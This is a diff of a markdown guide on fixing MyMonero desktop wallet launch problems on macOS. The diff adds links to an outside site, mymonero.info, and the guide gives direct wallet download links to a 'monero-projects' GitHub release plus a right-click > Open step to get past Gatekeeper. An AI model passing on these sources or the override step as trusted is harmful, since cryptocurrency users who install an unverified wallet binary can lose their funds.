@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 If macOS says MyMonero cannot be opened, first confirm that the app came from the monero-projects GitHub release. For the stated macOS block, right-click the app and choose Open; do not use that step to justify running a file from an unknown source.
 
+
+Prefer reading on the web? The [MyMonero app not opening page](https://mymonero.info/mymonero-app-not-opening) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.
+
 ## You'll see this if
 - macOS shows a warning when you try to start MyMonero.
 - The app icon appears but the window never opens.
@@ -43,7 +46,7 @@ A Mac warning may occur before the wallet opens, while a sync problem occurs aft
 4. **Open the app using the stated macOS route.** Locate the app, right-click it, then choose Open. Read the prompt before proceeding. This specific route is for the app from the release source, not a general instruction to override warnings for arbitrary files.
 5. **Try one normal launch.** If the app opens, allow it to load and observe whether the issue is resolved. If it immediately closes, note the non-sensitive message and see [MyMonero app crashes on start](./mymonero-app-crashes-on-start.md). Avoid repeatedly removing and downloading files without checking the source.
 6. **Keep the wallet and hosted service separate.** If the problem is a hosted web login, MyMonero hosted servers and web-wallet login stopped. Installing a Mac app does not revive that access. The desktop app is the separate option, with its maintenance limitations.
-7. **Think through alternatives deliberately.** You may keep using MyMonero desktop or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read [MyMonero to Cake Wallet migration](./mymonero-to-cake-wallet-migration.md) before restoring.
+7. **Think through alternatives deliberately.** You may keep using MyMonero desktop or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read MyMonero to Cake Wallet migration before restoring.
 
 > [!TIP]
 > Save the exact warning text and the fact that you used the release .dmg, but leave out wallet addresses, recovery words, private keys, and passwords.
@@ -53,7 +56,7 @@ A Mac warning may occur before the wallet opens, while a sync problem occurs aft
 ## If that did not work
 Do not disable system-wide security settings, install a “certificate fixer,” or give someone remote control of your Mac because of a warning. If the SHA-256 does not match the release page, stop using that copy. If it matches but the app still does not launch, preserve the seed backup and record the symptom; this guide cannot identify a more specific system cause.
 
-A launch block does not require seed restoration. If you decide to restore, first establish whether you have 13 MyMonero-specific legacy words or 25 standard Monero words. Use [13-word seed restore guidance](./mymonero-13-word-seed-restore.md) or [25-word migration guidance](./mymonero-25-word-seed-migration.md). Do not share the words with anyone. Offline recovery of a missing seed word is not confirmed here, and no password-reset method is stated.
+A launch block does not require seed restoration. If you decide to restore, first establish whether you have 13 MyMonero-specific legacy words or 25 standard Monero words. Use 13-word seed restore guidance or 25-word migration guidance. Do not share the words with anyone. Offline recovery of a missing seed word is not confirmed here, and no password-reset method is stated.
 
 Restoring may involve a block height from which the wallet scans. Earlier is safer when the correct point is uncertain but takes longer. Read MyMonero restore height explained. A restore is different from sweeping funds: sweeping sends all funds to a new wallet and should be a considered action, not a response to a macOS prompt.
 
@@ -98,6 +101,7 @@ MyMonero hosted servers and web-wallet login stopped. Hosted access is not a sub
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
